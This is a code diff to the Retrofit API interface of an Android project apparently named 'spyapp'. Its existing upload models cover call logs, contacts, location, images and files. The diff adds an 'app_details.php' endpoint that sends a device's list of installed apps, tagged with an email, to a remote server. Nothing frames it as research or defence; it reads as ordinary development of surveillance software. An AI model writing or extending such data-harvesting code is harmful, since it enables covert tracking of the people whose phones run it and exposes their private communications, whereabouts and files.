@@ -1,8 +1,11 @@
 package kkactive_india.in.spyapp;
 
+import java.util.List;
+
 import kkactive_india.in.spyapp.FilePOJO.fileBean;
 import kkactive_india.in.spyapp.ImagesPOJO.ImgBean;
 import kkactive_india.in.spyapp.MainPOJO.MainBean;
+import kkactive_india.in.spyapp.appDetailsPOJO.detailsBean;
 import kkactive_india.in.spyapp.callLogPOJO.callsBean;
 import kkactive_india.in.spyapp.contactPOJO.contactBean;
 import kkactive_india.in.spyapp.locationPOJO.locationBean;
@@ -86,6 +89,14 @@ public interface Allapi {
     Call<fileBean> files (
             @Part("email") String m,
             @Part MultipartBody.Part file
+    );
+
+
+    @Multipart
+    @POST("app_details.php")
+    Call<detailsBean> details (
+            @Part("email") String m,
+            @Part("apps") String n
     );
 
 
